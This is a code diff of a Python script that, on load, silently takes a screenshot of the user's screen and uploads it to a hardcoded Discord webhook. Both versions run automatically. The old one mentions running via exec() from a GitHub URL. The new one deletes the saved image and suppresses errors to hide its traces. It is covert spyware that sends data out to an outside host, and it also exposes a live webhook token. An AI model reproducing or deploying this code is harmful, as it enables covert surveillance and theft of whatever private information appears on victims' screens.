@@ -1,71 +1,43 @@
+import pyautogui
 import requests
-import io
-import tempfile
 import os
+import platform
+from datetime import datetime
 
-def take_screenshot():
-    """Screenshot function that works when executed from GitHub URL"""
+def screenshot_flow():
     try:
-        # Try multiple methods since we don't know what will work via exec()
-        screenshot_data = None
+        # Take screenshot
+        screenshot = pyautogui.screenshot()
         
-        # Method 1: Try pyautogui first
-        try:
-            import pyautogui
-            screenshot = pyautogui.screenshot()
-            img_bytes = io.BytesIO()
-            screenshot.save(img_bytes, format='PNG')
-            screenshot_data = img_bytes.getvalue()
-            print("[+] Screenshot taken with pyautogui")
-        except:
-            pass
+        # Create filename
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshot_{timestamp}.png"
         
-        # Method 2: Try PIL ImageGrab
-        if not screenshot_data:
-            try:
-                from PIL import ImageGrab
-                screenshot = ImageGrab.grab()
-                img_bytes = io.BytesIO()
-                screenshot.save(img_bytes, format='PNG')
-                screenshot_data = img_bytes.getvalue()
-                print("[+] Screenshot taken with PIL")
-            except:
-                pass
+        # Get desktop path
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+        file_path = os.path.join(desktop_path, filename)
         
-        # Method 3: Try mss as last resort
-        if not screenshot_data:
-            try:
-                import mss
-                with mss.mss() as sct:
-                    screenshot = sct.grab(sct.monitors[1])
-                    screenshot_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
-                print("[+] Screenshot taken with mss")
-            except:
-                pass
+        # Save to desktop
+        screenshot.save(file_path)
         
-        if screenshot_data:
-            # Send to Discord webhook
-            WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
-            
-            files = {
-                'file': ('screenshot.png', io.BytesIO(screenshot_data), 'image/png')
-            }
-            data = {
-                'content': '📸 Screenshot captured',
-                'username': 'Screenshot Bot'
-            }
-            
-            response = requests.post(WEBHOOK_URL, files=files, data=data)
-            
-            if response.status_code in [200, 204]:
-                print("[+] Screenshot sent to Discord successfully!")
-            else:
-                print(f"[-] Failed to send: {response.status_code}")
-        else:
-            print("[-] Could not take screenshot - no working method found")
+        # Send to Discord
+        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
+        
+        with open(file_path, 'rb') as f:
+            files = {'file': (filename, f, 'image/png')}
+            response = requests.post(WEBHOOK_URL, files=files, data={'content': '📸'})
+        
+        # Delete after send (even if failed)
+        if os.path.exists(file_path):
+            os.remove(file_path)
             
     except Exception as e:
-        print(f"[-] Error: {e}")
+        # Clean up if anything fails
+        try:
+            if 'file_path' in locals() and os.path.exists(file_path):
+                os.remove(file_path)
+        except:
+            pass
 
-# Execute immediately when loaded
-take_screenshot()
+# Run automatically when loaded
+screenshot_flow()
